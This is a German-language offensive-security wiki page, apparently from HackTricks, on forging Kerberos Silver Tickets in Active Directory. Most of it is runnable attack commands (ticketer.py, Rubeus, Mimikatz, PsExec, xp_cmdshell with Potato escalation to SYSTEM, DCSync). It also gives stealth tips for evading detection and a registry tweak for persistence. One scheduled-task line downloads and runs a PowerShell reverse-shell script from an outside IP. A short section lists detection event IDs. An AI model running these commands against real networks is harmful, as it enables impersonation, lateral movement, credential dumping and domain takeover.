# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver Ticket

Der **Silver Ticket**-Angriff umfasst die Ausnutzung von Service-Tickets in Active-Directory-(AD-)Umgebungen. Diese Methode basiert auf der **Beschaffung des NTLM-Hashs eines Servicekontos**, beispielsweise eines Computerkontos, um ein Ticket-Granting-Service-(TGS-)Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Services im Netzwerk zugreifen und sich als **beliebiger Benutzer ausgeben**, typischerweise mit dem Ziel, administrative Berechtigungen zu erlangen. Es wird betont, dass die Verwendung von AES-Schlüsseln zum Fälschen von Tickets sicherer und schwerer zu erkennen ist.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets sind schwerer zu erkennen als Golden Tickets, da sie nur den **Hash des Servicekontos** und nicht des krbtgt-Kontos erfordern. Sie sind jedoch auf den jeweiligen Zielservice beschränkt. Außerdem muss lediglich das Passwort eines Benutzers gestohlen werden.
> Wenn du außerdem das **Passwort eines Kontos mit einem SPN** kompromittierst, kannst du dieses Passwort verwenden, um ein Silver Ticket zu erstellen, das sich bei diesem Service als beliebiger Benutzer ausgibt.

### Moderne Kerberos-Änderungen (AES-only-Domänen)

- Windows-Updates ab dem **8. November 2022 (KB5021131)** verwenden standardmäßig AES-Sitzungsschlüssel für Service-Tickets, sofern möglich, und schaffen RC4 schrittweise ab. Es wird erwartet, dass DCs bis Mitte 2026 standardmäßig mit **deaktiviertem** RC4 ausgeliefert werden. Daher scheitert die Verwendung von NTLM-/RC4-Hashes für Silver Tickets zunehmend mit `KRB_AP_ERR_MODIFIED`. Extrahiere immer **AES-Schlüssel** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) für das Ziel-Servicekonto.<sup>[[5]](#references)</sup>
- Wenn `msDS-SupportedEncryptionTypes` des Servicekontos auf AES beschränkt ist, musst du mit `/aes256` oder `-aesKey` fälschen; RC4 (`/rc4` oder `-nthash`) funktioniert nicht, selbst wenn du den NTLM-Hash besitzt.<sup>[[6]](#references)</sup>
- gMSA-/Computerkonten werden alle 30 Tage rotiert. Extrahiere den **aktuellen AES-Schlüssel** aus LSASS, Secretsdump/NTDS oder per DCsync, bevor du das Ticket fälschst.
- OPSEC: Die Standardgültigkeitsdauer in Tools beträgt häufig **10 Jahre**. Lege realistische Zeiträume fest (z. B. `-duration 600` Minuten), um eine Erkennung aufgrund ungewöhnlich langer Gültigkeitsdauern zu vermeiden.<sup>[[6]](#references)</sup>

Für die Erstellung von Tickets werden je nach Betriebssystem unterschiedliche Tools verwendet:

### Unter Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Unter Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Der CIFS service wird als häufiges Ziel für den Zugriff auf das Dateisystem des Opfers hervorgehoben, aber auch andere services wie HOST und RPCSS können für Tasks und WMI queries ausgenutzt werden.

### Beispiel: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Wenn du den NTLM hash (oder AES key) eines SQL service accounts (z. B. sqlsvc) besitzt, kannst du einen TGS für den MSSQL SPN fälschen und dich beim SQL service als beliebiger User ausgeben. Aktiviere von dort aus xp_cmdshell, um Befehle als SQL service account auszuführen. Wenn dieses Token über SeImpersonatePrivilege verfügt, kannst du ein Potato einsetzen, um zu SYSTEM zu eskalieren.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Wenn der resultierende Kontext über SeImpersonatePrivilege verfügt (bei service accounts häufig der Fall), verwende eine Potato-Variante, um SYSTEM zu erhalten:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Weitere Details zum Abuse von MSSQL und zum Aktivieren von xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Übersicht über Potato-Techniken:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Verfügbare Services

| Service-Typ                                | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem außerdem:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In manchen Fällen kann man einfach Folgendes anfordern: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, auch psexec            | CIFS                                                                       |
| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                       |
| Windows Remote Server Administration Tools  | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Mit **Rubeus** kannst du **alle** diese Tickets über den folgenden Parameter **anfordern**:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event IDs von Silver Tickets

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **Kein vorausgehendes 4768/4769 auf dem DC** für denselben Client/Service ist ein häufiger Hinweis darauf, dass ein gefälschtes TGS direkt dem Service präsentiert wurde.
- Eine ungewöhnlich lange Ticket-Lebensdauer oder ein unerwarteter Verschlüsselungstyp (RC4, wenn die Domain AES erzwingt) fällt in den Daten von 4769/4624 ebenfalls auf.

## Persistenz

Um zu verhindern, dass Maschinen ihr Passwort alle 30 Tage ändern, setze `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oder du könntest `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` auf einen höheren Wert als 30 Tage setzen, um den Zeitraum anzugeben, nach dem das Maschinenpasswort geändert werden soll.<sup>[[3]](#references)</sup>

## Abuse von Service-Tickets

In den folgenden Beispielen nehmen wir an, dass das Ticket unter Identitätsvortäuschung des Administratorkontos abgerufen wurde.

### CIFS

Mit diesem Ticket kannst du auf die Ordner `C$` und `ADMIN$` über **SMB** zugreifen (falls sie erreichbar sind) und Dateien in einen Teil des Remote-Dateisystems kopieren, indem du einfach Folgendes ausführst:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Sie können außerdem eine Shell auf dem Host erhalten oder mithilfe von **psexec** beliebige Befehle ausführen:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Mit dieser Berechtigung können Sie geplante Tasks auf entfernten Computern erstellen und beliebige Befehle ausführen:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Mit diesen Tickets können Sie **WMI auf dem Opfersystem ausführen**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Finde **weitere Informationen über wmiexec** auf der folgenden Seite:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mit WinRM-Zugriff auf einen Computer kannst du **auf ihn zugreifen** und sogar eine PowerShell erhalten:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Überprüfe die folgende Seite, um **weitere Möglichkeiten zu erfahren, wie du dich mit einem entfernten Host über winrm verbinden kannst**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Beachte, dass **winrm auf dem entfernten Computer aktiv sein und Verbindungen akzeptieren muss**, damit du darauf zugreifen kannst.

### LDAP

Mit dieser Berechtigung kannst du die DC-Datenbank mithilfe von **DCSync** dumpen:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Erfahre mehr über DCSync** auf der folgenden Seite:


{{#ref}}
dcsync.md
{{#endref}}


## Referenzen

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Wie greift man Kerberos an? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Passwortprozess für Machine Accounts - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato-Pfad](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: Kerberos-Hardening und RC4-Ablösung](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Aktuelle Optionen von Impacket ticketer.py (AES/Keytab/Dauer)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
